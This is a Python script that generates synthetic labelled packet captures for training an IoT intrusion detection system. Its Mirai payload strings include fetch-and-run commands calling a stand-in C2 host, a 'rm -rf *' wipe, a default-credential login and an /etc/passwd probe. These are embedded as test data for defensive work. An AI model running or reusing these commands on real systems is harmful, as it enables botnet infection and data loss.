"""Generate synthetic labeled PCAPs across train, validation, and test splits for Packet IDS."""
import os
import random
import string
from pathlib import Path
from scapy.all import Ether, IP, TCP, UDP, ICMP, Raw, wrpcap

ROOT = Path(__file__).resolve().parents[1]
CAPTURES_DIR = ROOT / 'data/captures'
CAPTURES_DIR.mkdir(parents=True, exist_ok=True)

CLASSES = [
    'BenignTraffic',
    'DDoS-UDP_Flood',
    'DDoS-SYN_Flood',
    'Mirai-greeth_flood',
    'Recon-PortScan',
]

SPLITS = ['train', 'validation', 'test']
PACKET_COUNT_PER_SPLIT = {
    'train': 300,
    'validation': 100,
    'test': 100,
}


def random_string(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_benign_payload(split: str, i: int) -> bytes:
    templates = [
        f"GET /index.html?session={split}_{i}_{random_string(8)} HTTP/1.1\r\nHost: iot-hub.local\r\nUser-Agent: Mozilla/5.0 (IoT-Client/2.4)\r\nAccept: */*\r\n\r\n",
        f"POST /api/v1/telemetry HTTP/1.1\r\nHost: api.iot.org\r\nContent-Type: application/json\r\n\r\n{{\"sensor_id\": \"temp_{split}_{i:04d}\", \"temperature\": {20.0 + (i % 15) * 0.5:.2f}, \"humidity\": {40 + (i % 30)}, \"battery_mv\": {3300 - (i % 200)}}}\r\n",
        f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 42\r\n\r\n{{\"status\": \"ok\", \"timestamp\": {1700000000 + i * 10}, \"code\": 0, \"req_id\": \"{split}_{i}\"}}",
        f"\x10\x2a\x00\x04MQTT\x04\x02\x00\x3c\x00\x0cdevice_{split}_{i:06d}" + random_string(16),
        f"\x30\x34\x00\x0e/sensors/state{{\"power\": true, \"mode\": \"auto\", \"cycle\": {i}, \"nonce\": \"{split}_{random_string(6)}\"}}",
    ]
    base = templates[i % len(templates)].encode('utf-8', errors='ignore')
    extra = f"&ref={split}_{i}_{random_string(12 + (i % 20))}".encode('utf-8')
    return base + extra


def generate_ddos_udp_payload(split: str, i: int) -> bytes:
    flood_patterns = [
        f"\xff\xff\xff\xffgetstatus_{split}_{i}\x00".encode('latin1') + os.urandom(64 + (i % 128)),
        f"\x00\x00\x10\x00FLOOD_AMPLIFY_PAYLOAD_MARKER_{split}_{i}_".encode('latin1') + os.urandom(128 + (i % 256)),
        f"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03{split}_{i}".encode('latin1') + os.urandom(100 + (i % 50)),
        f"UDP_DATA_BURST_{split}_{i}_".encode('latin1') + os.urandom(200 + (i % 300)),
    ]
    return flood_patterns[i % len(flood_patterns)]


def generate_ddos_syn_payload(split: str, i: int) -> bytes:
    patterns = [
        f"SYN_FLOOD_RAW_STREAM_{split}_{i}_".encode('latin1') + os.urandom(64 + (i % 120)),
        f"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03{split}_{i}".encode('latin1') + os.urandom(150 + (i % 100)),
        f"TCP_PAYLOAD_EXHAUSTION_{split}_{i}_".encode('latin1') + random_string(32 + (i % 64)).encode('latin1'),
    ]
    return patterns[i % len(patterns)]


def generate_mirai_payload(split: str, i: int) -> bytes:
    patterns = [
        f"/bin/busybox WGET http://192.168.1.100/bins/mirai.arm7 -O /tmp/{split}_{i}_{random_string(4)}; chmod 777 /tmp/{split}_{i}_{random_string(4)}; /tmp/{split}_{i}_{random_string(4)} {random_string(8)}".encode('utf-8'),
        f"USER root\r\nPASS xc3511_{split}_{i:04d}\r\nENABLE\r\nsystem shell {random_string(10)}\r\n".encode('utf-8'),
        f"\x00\x00\x00\x00\x00\x01\x00\x00MIRAI_GREETH_BURST_ATTACK_VECTOR_{split}_{i}_".encode('latin1') + os.urandom(128 + (i % 128)),
        f"cd /tmp || cd /var/run || cd /mnt; rm -rf *; wget http://c2.botnet.cc/g -O g_{split}_{i}; sh g_{split}_{i}".encode('utf-8'),
    ]
    return patterns[i % len(patterns)]


def generate_recon_payload(split: str, i: int) -> bytes:
    patterns = [
        f"SSH-2.0-OpenSSH_SCAN_PROBE_{split}_{i:04d}_{random_string(6)}\r\n".encode('utf-8'),
        f"HEAD /robots.txt HTTP/1.0\r\nHost: 192.168.1.{10 + (i % 50)}\r\nUser-Agent: Nmap Scripting Engine ({split}_{i}_{random_string(8)})\r\n\r\n".encode('utf-8'),
        f"\x00\x00\x00\x00\x00\x00\x00\x00PORT_SCAN_SYN_PROBE_{split}_{i}_".encode('latin1') + os.urandom(32 + (i % 40)),
        f"HELP\r\nSITE CPFR /etc/passwd_{split}_{i}_{random_string(4)}\r\nQUIT\r\n".encode('utf-8'),
    ]
    return patterns[i % len(patterns)]


PAYLOAD_GENERATORS = {
    'BenignTraffic': generate_benign_payload,
    'DDoS-UDP_Flood': generate_ddos_udp_payload,
    'DDoS-SYN_Flood': generate_ddos_syn_payload,
    'Mirai-greeth_flood': generate_mirai_payload,
    'Recon-PortScan': generate_recon_payload,
}


def build_packets(label: str, split: str, count: int, split_seed: int):
    random.seed(split_seed)
    gen = PAYLOAD_GENERATORS[label]
    packets = []
    eth_src = f"00:11:22:33:44:{(split_seed % 90 + 10):02x}"
    eth_dst = f"66:77:88:99:aa:{(split_seed % 90 + 10):02x}"
    eth = Ether(src=eth_src, dst=eth_dst)

    for i in range(count):
        payload = gen(split, i)
        src_ip = f"192.168.1.{10 + (i % 100)}"
        dst_ip = f"10.0.0.{1 + (i % 20)}"
        sport = 1024 + (i % 50000)
        dport = 80 if label == 'BenignTraffic' else (53 if 'UDP' in label else 23 if 'Mirai' in label else 8080)

        if 'UDP' in label:
            ip_layer = IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=dport) / Raw(load=payload)
        elif label == 'Recon-PortScan' and (i % 2 == 0):
            ip_layer = IP(src=src_ip, dst=dst_ip) / ICMP() / Raw(load=payload)
        else:
            ip_layer = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='PA') / Raw(load=payload)
        packets.append(eth / ip_layer)
    return packets


def main():
    print(f"Generating synthetic captures in {CAPTURES_DIR}...")
    manifest_rows = [
        "path,label,split,capture_id,dataset,source_url\n"
    ]

    seed_offsets = {'train': 1000, 'validation': 2000, 'test': 3000}

    for label in CLASSES:
        clean_label = label.lower().replace('-', '_')
        for split in SPLITS:
            filename = f"{clean_label}_{split}.pcap"
            file_path = CAPTURES_DIR / filename
            count = PACKET_COUNT_PER_SPLIT[split]
            split_seed = seed_offsets[split] + CLASSES.index(label) * 100

            pkts = build_packets(label, split, count, split_seed)
            wrpcap(str(file_path), pkts)
            print(f"  [+] Wrote {len(pkts)} packets with Ethernet frames to {file_path.relative_to(ROOT)}")

            # Relative path from data/ directory
            rel_path = f"captures/{filename}"
            capture_id = f"{clean_label}-session-{split}"
            manifest_rows.append(f"{rel_path},{label},{split},{capture_id},CICIoT2023,\n")

    manifest_path = ROOT / 'data/packet_manifest.csv'
    manifest_path.write_text(''.join(manifest_rows), encoding='utf-8')
    print(f"\n[OK] Updated manifest: {manifest_path.relative_to(ROOT)}")
    print(f"Total entries in manifest: {len(manifest_rows) - 1}")


if __name__ == '__main__':
    main()
